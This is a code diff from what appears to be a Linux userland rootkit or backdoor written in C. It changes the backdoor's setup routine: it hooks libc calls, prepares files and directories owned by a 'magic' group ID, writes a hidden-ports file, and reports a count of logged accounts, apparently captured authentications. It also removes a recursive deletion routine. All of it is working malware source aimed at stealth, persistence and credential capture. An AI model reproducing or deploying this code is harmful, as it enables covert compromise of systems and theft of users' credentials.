@@ -49,10 +49,13 @@ int preparedir(const char *path, gid_t magicgid){
 
 #ifdef HIDE_PORTS
 void preparehideports(gid_t magicgid){
-    if(prepareregfile(HIDEPORTS, magicgid) < 0)
+    hook(CFOPEN, CACCESS);
+
+    if((long)call(CACCESS, HIDEPORTS, F_OK) == 0)
         return;
 
-    hook(CFOPEN);
+    if(prepareregfile(HIDEPORTS, magicgid) < 0)
+        return;
 
     FILE *fp = call(CFOPEN, HIDEPORTS, "a");
     if(fp == NULL) return;
@@ -69,8 +72,8 @@ void bdprep(void){
     char *curpath;
     gid_t magicgid = readgid();
     int dirs=0, regs=0;
-    for(int i = 0; i != TOGPATHS_SIZE; i++){
-        curpath = togpaths[i];
+    for(int i = 0; i != BDVPATHS_SIZE; i++){
+        curpath = bdvpaths[i];
 
         if(curpath[strlen(curpath)-1] == '/'){
             if(preparedir(curpath, magicgid))
@@ -85,11 +88,10 @@ void bdprep(void){
     preparehideports(magicgid);
 #endif
 
-    if(regs+dirs != TOGPATHS_SIZE)
+    if(regs+dirs != BDVPATHS_SIZE)
         printf("\e[1mIt looks like something may have went wrong setting everything up...\e[0m\n");
     else{
         dorolf();
-        system("id&&w");
 #ifdef LOG_LOCAL_AUTH
         int authc = logcount(LOG_PATH);
         if(authc>0) printf("\e[1mLogged accounts: \e[1;31m%d\e[0m\n", authc);
@@ -111,35 +113,7 @@ void bdprep(void){
         }
 #endif
     }
-    exit(0);
-}
-
-void eradicatedir(const char *target){
-    DIR *dp;
-    struct dirent *dir;
-    struct stat pathstat;
-
-    hook(COPENDIR, CREADDIR, CUNLINK, CRMDIR, C__XSTAT);
-
-    dp = call(COPENDIR, target);
-    if(dp == NULL) return;
-
-    while((dir = call(CREADDIR, dp)) != NULL){
-        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
-            continue;
-
-        char path[strlen(target)+strlen(dir->d_name)+2];
-        snprintf(path, sizeof(path), "%s/%s", target, dir->d_name);
-
-        memset(&pathstat, 0, sizeof(struct stat));
-        if((long)call(C__XSTAT, _STAT_VER, path, &pathstat) != -1)
-            if(S_ISDIR(pathstat.st_mode))
-                eradicatedir(path); // we recursive.
-
-        if((long)call(CUNLINK, path) < 0 && errno != ENOENT)
-            printf("Failed unlink on %s\n", path);
-    }
-    closedir(dp);
-    if((long)call(CRMDIR, target) < 0 && errno != ENOENT)
-        printf("Failed rmdir on %s\n", target);
+    symlinkstuff();
+    if(isatty(fileno(stdout)))
+        system("id;w");
 }
